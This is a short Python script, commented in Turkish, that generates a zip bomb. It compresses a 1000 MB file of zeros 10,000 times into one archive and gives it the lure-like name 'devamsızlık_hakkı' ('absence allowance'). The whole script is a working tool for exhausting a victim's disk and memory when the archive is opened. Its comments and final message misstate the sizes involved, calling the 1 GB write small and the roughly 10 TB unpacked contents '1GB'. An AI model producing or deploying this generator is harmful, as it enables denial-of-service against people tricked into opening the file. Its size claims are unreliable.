import zipfile
import os

print("--- ZIP BOMB GENERATOR (Mini) ---")
print("UYARI: Bu dosyayı sakın kendin açma!")

def make_bomb():
    # 1. Adım: İçi '0' dolu büyük bir text dosyası yap
    dummy_name = "dummy.txt"
    with open(dummy_name, "w") as f:
        # 1000 MB'lık veri yaz (Demo için küçük tutuyoruz)
        f.write("0" * 1000 * 1024 * 1024) 
    
    # 2. Adım: Bunu yüksek oranda sıkıştır
    zip_name = "devamsızlık_hakkı"
    with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as z:
        # Aynı dosyayı 10000 kere zip içine at
        for i in range(10000):
            z.write(dummy_name, arcname=f"file_{i}.txt")
    
    os.remove(dummy_name) # Geçici dosyayı sil
    print(f"✅ {zip_name} oluşturuldu! Boyutu çok küçük ama içi 1GB!")

make_bomb()